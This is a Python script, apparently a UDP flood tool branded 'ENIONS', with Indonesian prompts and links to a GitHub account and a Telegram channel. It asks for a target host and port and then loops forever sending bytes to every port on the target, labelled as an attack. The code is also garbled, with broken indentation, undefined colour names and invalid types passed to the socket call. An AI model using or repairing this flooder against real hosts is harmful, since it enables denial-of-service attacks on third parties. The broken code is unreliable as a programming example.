#Author WHITE L'
import socket
import os
import random
import time
import sys



white = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
K_bytes = random._urandom(35516)
K_bytes = random._urandom(35512)

os.system("clear")

            RED=Fore.LIGHTRED_EX
            GREEN=Fore.LIGHTGREEN_EX
            CYAN=Fore.LIGHTCYAN_EX
            YELLOW=Fore.LIGHTYELLOW_EX
        else:
            
            RED=''
            GREEN=''
            CYAN=''
            YELLOW=''
        print(
CYAN+f"""

███████╗███╗░░██╗██╗░█████╗░███╗░░██╗░██████╗
██╔════╝████╗░██║██║██╔══██╗████╗░██║██╔════╝
█████╗░░██╔██╗██║██║██║░░██║██╔██╗██║╚█████╗░
██╔══╝░░██║╚████║██║██║░░██║██║╚████║░╚═══██╗
███████╗██║░╚███║██║╚█████╔╝██║░╚███║██████╔╝
╚══════╝╚═╝░░╚══╝╚═╝░╚════╝░╚═╝░░╚══╝╚═════╝░
{RESET}Waktu Tempuh:{YELLOW}03:28{RESET}
Name Tools {YELLOW}ENIONS•PLANET✓✓✓
============================================
{RESET}Create Tanggal: {RED}11/{YELLOW}05/{GREEN}2023{RESET}
Pembuat Tolls: {YELLOW}ENIONS{GREEN}PLANET{YELLOW}✓✓✓
""")

print()
print("\033[32m================================================================\033[0m")
print("\033[32m{YELLOW}Tool Devoloper : {YELLOW}ENIONS • DARKNESS\033[0m")
print("\033[33m{YELLOW}Github 	       : {YELLOW}https://github.com/ENIONS-DARKNES/\033[0m")
print("\033[33m{YELLOW}Telegram       : {YELLOW}https://t.me/Enions•DARKNESS\033[0m")
print("\033[32m================================================================\033[0m")
print()

ip = input("[+] Enter the targets host : ")
Port = input("[+] Enter the targets port : ")
sent = input("[+] Enter the targets packet 1-20000000 : ")
ping = input("[+] Enter the targets ping 1-20000000 : ")
K_bytes = input("[+] Enter the bytes tools : ")
os.system("clear")
print("Attack starting...")
time.sleep(3)
while True:
    sent = 0
    for port in range(1, 65534):
        white.sendto(K_bytes, (ip, port))
        if K_bytes==65534:
                K_bytes=1
            elif port==1900:
                port=1901
                if sent==65534:
                sent=1
        print("\033[1;91mSend \033[1;32m%s \033[1;91m Mengirim Packet \033[1;32m%s \033[1;91mThrough port \033[1;32m%s " % (sent, ip, port))

print("\033[1;92mAttack finished\033[0m")
